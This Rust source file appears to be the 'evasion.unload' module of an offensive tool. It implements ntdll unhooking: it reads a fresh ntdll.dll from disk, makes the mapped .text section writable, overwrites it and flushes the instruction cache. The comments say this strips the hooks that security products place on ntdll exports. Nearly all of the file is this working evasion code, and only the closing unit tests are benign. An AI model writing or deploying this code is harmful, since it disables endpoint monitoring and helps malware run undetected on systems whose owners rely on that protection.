//! The fresh-copy edge (the module's whole platform surface): where
//! the fresh ntdll lives, how the two images meet, and how the rows
//! render. The halves that must hold for a test -- the row
//! renderings -- are plain functions this host runs anywhere; only
//! the disk read, the module lookup, the page flips, and the cache
//! flush sit behind `cfg(windows)`, and the Windows crosses the CI
//! lane builds prove they compile.
//!
//! Two scoping facts shape the rows' honesty. The rewrite addresses
//! this process's own mapping: the pages flip copy-on-write as the
//! copy lands, nothing outside the process changes, and the effect
//! dies with it -- a new process maps fresh libraries. And the disk
//! copy is the freshness source v1.0 trusts, behind the build
//! fingerprint the parse refuses on: the KnownDlls section-object
//! path (a copy no on-disk tamper reaches) is the module's later
//! widening, not this surface's guess.

/// The library the v1.0 surface addresses: the one whose exports
/// every security product hooks, and the one a fresh copy of is the
/// classic unhook.
pub(crate) const MODULE: &str = "ntdll.dll";

/// The read's row: how many `.text` bytes differ from the disk copy.
pub(crate) fn list_row(differing: usize, total: usize) -> String {
    if differing == 0 {
        format!("{MODULE}: .text matches the disk copy (0 of {total} bytes differ)")
    } else {
        format!("{MODULE}: {differing} of {total} .text bytes differ from the disk copy")
    }
}

/// The write's row: how many bytes the restore rewrote, or the
/// idempotence read -- a second run reports rather than writes again.
pub(crate) fn restore_row(rewritten: usize, total: usize) -> String {
    if rewritten == 0 {
        format!("{MODULE}: .text already matches the disk copy -- nothing rewritten")
    } else {
        format!(
            "{MODULE}: .text restored from the disk copy ({rewritten} of {total} bytes rewritten)"
        )
    }
}

// ---- the Windows calls ----

#[cfg(windows)]
pub(crate) mod win {
    use std::os::raw::c_void;

    use super::MODULE;
    use crate::pe;

    const GENERIC_READ: u32 = 0x8000_0000;
    const FILE_SHARE_READ: u32 = 0x1;
    const FILE_SHARE_WRITE: u32 = 0x2;
    const FILE_SHARE_DELETE: u32 = 0x4;
    const OPEN_EXISTING: u32 = 3;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    // The read cap: an ntdll is two megabytes, and a file beyond this
    // is not the copy this verb was asked to read.
    const READ_CAP: usize = 64 << 20;

    type Handle = isize;
    const INVALID_HANDLE_VALUE: isize = -1;

    #[link(name = "kernel32")]
    extern "system" {
        fn GetEnvironmentVariableW(name: *const u16, buffer: *mut u16, size: u32) -> u32;
        fn CreateFileW(
            path: *const u16,
            access: u32,
            share: u32,
            security: *const c_void,
            disposition: u32,
            flags: u32,
            template: Handle,
        ) -> Handle;
        fn ReadFile(
            file: Handle,
            buffer: *mut u8,
            to_read: u32,
            read: *mut u32,
            overlapped: *mut c_void,
        ) -> i32;
        fn CloseHandle(file: Handle) -> i32;
        fn GetLastError() -> u32;
        fn GetModuleHandleW(name: *const u16) -> *mut c_void;
        fn VirtualProtect(
            address: *mut c_void,
            size: usize,
            new_protect: u32,
            old_protect: *mut u32,
        ) -> i32;
        fn FlushInstructionCache(process: Handle, base: *const c_void, size: usize) -> i32;
        fn GetCurrentProcess() -> Handle;
    }

    /// A NUL-terminated UTF-16 string, the encoding every `*W` entry
    /// point takes.
    fn wide(text: &str) -> Vec<u16> {
        text.encode_utf16().chain(std::iter::once(0)).collect()
    }

    /// The SystemRoot the fresh copy lives under: the fact of the
    /// machine this process runs on, not a path it guesses.
    fn system_root() -> Result<String, String> {
        unsafe {
            let name = wide("SystemRoot");
            let mut buffer = vec![0u16; 1024];
            let length =
                GetEnvironmentVariableW(name.as_ptr(), buffer.as_mut_ptr(), buffer.len() as u32);
            if length == 0 || length as usize >= buffer.len() {
                return Err(format!(
                    "evasion.unload: no SystemRoot environment for this user -- the fresh \
                     {MODULE} copy lives under it"
                ));
            }
            Ok(String::from_utf16_lossy(&buffer[..length as usize]))
        }
    }

    /// A file's bytes, read whole with every share mode offered: the
    /// system's own ntdll sits open for mapping, and the read takes
    /// it as the system leaves it or names the lock that refused.
    fn read_file(path: &str) -> Result<Vec<u8>, String> {
        unsafe {
            let file = CreateFileW(
                wide(path).as_ptr(),
                GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                std::ptr::null(),
                OPEN_EXISTING,
                0,
                0,
            );
            if file == INVALID_HANDLE_VALUE {
                return Err(format!(
                    "evasion.unload: {path}: {}",
                    file_error(GetLastError())
                ));
            }
            let read_all = || {
                let mut contents = Vec::new();
                let mut buffer = vec![0u8; 64 * 1024];
                loop {
                    let mut read: u32 = 0;
                    if ReadFile(
                        file,
                        buffer.as_mut_ptr(),
                        buffer.len() as u32,
                        &mut read,
                        std::ptr::null_mut(),
                    ) == 0
                    {
                        return Err(format!(
                            "evasion.unload: {path}: {}",
                            file_error(GetLastError())
                        ));
                    }
                    if read == 0 {
                        return Ok(contents);
                    }
                    if contents.len() + read as usize > READ_CAP {
                        return Err(format!(
                            "evasion.unload: {path} is larger than the {} MiB this reader \
                             takes",
                            READ_CAP >> 20
                        ));
                    }
                    contents.extend_from_slice(&buffer[..read as usize]);
                }
            };
            let contents = read_all();
            CloseHandle(file);
            contents
        }
    }

    fn file_error(code: u32) -> String {
        match code {
            2 => "the file does not exist".to_string(),
            3 => "the path does not exist".to_string(),
            5 => "access denied".to_string(),
            32 => "another process holds the file locked".to_string(),
            other => format!("file error {other}"),
        }
    }

    /// The mapped image as the parses read it: the module's base and
    /// how far its mapping runs. The headers live in the image's
    /// first page, so that page names the size of image that bounds
    /// the whole mapping; an image whose section table ran past the
    /// first page refuses in the parse, named like any truncated
    /// file. The borrow lives while the mapping does -- the loader
    /// never unloads ntdll.
    fn mapped() -> Result<(*const u8, usize), String> {
        unsafe {
            let module = GetModuleHandleW(wide(MODULE).as_ptr());
            if module.is_null() {
                return Err(format!(
                    "evasion.unload: {MODULE} is not loaded in this process"
                ));
            }
            let base = module.cast::<u8>();
            let head = std::slice::from_raw_parts(base, 0x1000);
            let size = pe::size_of_image(head)?;
            if size < 0x1000 {
                return Err(format!(
                    "evasion.unload: the mapped {MODULE} claims to be smaller than its \
                     own headers"
                ));
            }
            Ok((base, size))
        }
    }

    /// The two copies the verb sets beside one another: the disk
    /// image's bytes and the mapped image's (base, size). Everything
    /// after this is the shared pure parse.
    fn images() -> Result<(Vec<u8>, *const u8, usize), String> {
        let disk = read_file(&format!(r"{}\System32\{MODULE}", system_root()?))?;
        let (base, size) = mapped()?;
        Ok((disk, base, size))
    }

    /// The read: both images parsed, fingerprint-checked, and
    /// compared byte for byte over the `.text` they share.
    pub(crate) fn list() -> Result<String, String> {
        let (disk, base, size) = images()?;
        let mapped = unsafe { std::slice::from_raw_parts(base, size) };
        pe::same_build(&disk, mapped)?;
        let (disk_text, section) = pe::disk_text(&disk)?;
        let (offset, length) = pe::mapped_text(&section, mapped.len())?;
        let memory = &mapped[offset..offset + length];
        let differing = pe::differences(disk_text, memory)?;
        Ok(super::list_row(differing, length))
    }

    /// The write the operator names: the page flips writable, the
    /// disk `.text` copies over the mapped one, the protection
    /// returns to what it was, and the instruction cache flushes --
    /// a stale cache executes the old bytes on some architectures,
    /// so the flush is the write's last step, not polish.
    pub(crate) fn restore() -> Result<String, String> {
        let (disk, base, size) = images()?;
        let mapped = unsafe { std::slice::from_raw_parts(base, size) };
        pe::same_build(&disk, mapped)?;
        let (disk_text, section) = pe::disk_text(&disk)?;
        let (offset, length) = pe::mapped_text(&section, mapped.len())?;
        let memory = &mapped[offset..offset + length];
        let differing = pe::differences(disk_text, memory)?;

        // The idempotence read: a `.text` that already matches is
        // this module's own prior work.
        if differing == 0 {
            return Ok(super::restore_row(0, length));
        }
        unsafe {
            let at = base.add(offset);
            let mut previous: u32 = 0;
            if VirtualProtect(
                at as *mut c_void,
                length,
                PAGE_EXECUTE_READWRITE,
                &mut previous,
            ) == 0
            {
                return Err("evasion.unload: the .text page would not flip writable".to_string());
            }
            std::ptr::copy_nonoverlapping(disk_text.as_ptr(), at as *mut u8, length);
            VirtualProtect(at as *mut c_void, length, previous, &mut previous);
            if FlushInstructionCache(GetCurrentProcess(), at.cast(), length) == 0 {
                return Err(format!(
                    "evasion.unload: the instruction cache would not flush after the \
                     rewrite -- execution may read stale bytes"
                ));
            }
        }
        Ok(super::restore_row(differing, length))
    }
}

#[cfg(windows)]
pub(crate) use win::{list, restore};

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_read_names_the_count_it_found() {
        assert_eq!(
            list_row(0, 2048),
            "ntdll.dll: .text matches the disk copy (0 of 2048 bytes differ)"
        );
        assert_eq!(
            list_row(24, 2048),
            "ntdll.dll: 24 of 2048 .text bytes differ from the disk copy"
        );
    }

    #[test]
    fn the_write_names_what_it_rewrote_or_reported() {
        assert_eq!(
            restore_row(24, 2048),
            "ntdll.dll: .text restored from the disk copy (24 of 2048 bytes rewritten)"
        );
        // The idempotence read: a second run reports rather than
        // writes again.
        assert_eq!(
            restore_row(0, 2048),
            "ntdll.dll: .text already matches the disk copy -- nothing rewritten"
        );
    }
}
